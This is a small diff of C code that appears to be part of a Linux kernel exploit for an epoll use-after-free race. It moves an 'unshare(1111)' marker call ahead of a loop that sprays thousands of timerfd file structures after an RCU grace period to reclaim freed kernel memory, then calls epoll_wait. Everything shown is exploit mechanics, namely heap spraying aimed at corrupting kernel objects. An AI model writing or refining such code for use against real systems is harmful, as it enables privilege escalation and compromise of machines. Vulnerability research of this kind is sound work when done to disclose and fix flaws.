@@ -91,6 +91,9 @@ int main() {
     
     // Wait for the RCU grace period (same as Thread 3)
     usleep(1000000);
+    // Signal Thread 1 is about to epoll_wait
+    unshare(1111);
+    
     // Spray file structs via timerfd_create() on CPU 0
     for(int i = 4000; i < 8000; i++) {
         spray_fds[i] = timerfd_create(CLOCK_MONOTONIC, 0);
@@ -101,9 +104,6 @@ int main() {
         its.it_interval.tv_nsec = 0;
         timerfd_settime(spray_fds[i], 0, &its, NULL);
     }
-    
-    // Signal Thread 1 is about to epoll_wait
-    unshare(1111);
     
     struct epoll_event events[1];
     int n = epoll_wait(outer_epfd, events, 1, 1000);
